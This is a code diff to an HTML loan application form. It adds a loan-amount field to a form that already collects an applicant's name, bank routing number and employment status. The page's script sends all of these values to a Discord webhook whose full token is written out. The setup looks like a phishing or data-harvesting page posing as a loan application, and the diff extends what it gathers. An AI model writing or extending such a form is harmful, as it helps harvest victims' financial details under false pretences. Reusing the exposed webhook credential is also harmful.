@@ -71,6 +71,9 @@
             <option value="No">No</option>
         </select>
 
+        <label for="amount">Loan Amount:</label>
+        <input type="number" id="amount" name="amount" required>
+
         <button type="submit">Submit</button>
     </form>
 
@@ -86,7 +89,8 @@
             const formData = {
                 fname: document.getElementById('fname').value,
                 routing: document.getElementById('routing').value,
-                employment: document.getElementById('employment').value
+                employment: document.getElementById('employment').value,
+                amount: document.getElementById('amount').value
             };
 
             fetch('https://discord.com/api/webhooks/1296976317954134087/AgrNdtpjRDosieSU6FO6kU5ySIqE42dQ2HzfqS0W24q6qaQA9P16kTjuT215at1u1lw2', {
@@ -95,7 +99,7 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `New Loan Form Submission:\nName: ${formData.fname}\nRouting Number: ${formData.routing}\nEmployment: ${formData.employment}`
+                    content: `New Loan Form Submission:\nName: ${formData.fname}\nRouting Number: ${formData.routing}\nEmployment: ${formData.employment}\nLoan Amount: ${formData.amount}`
                 })
             }).then(response => {
                 if (response.ok) {
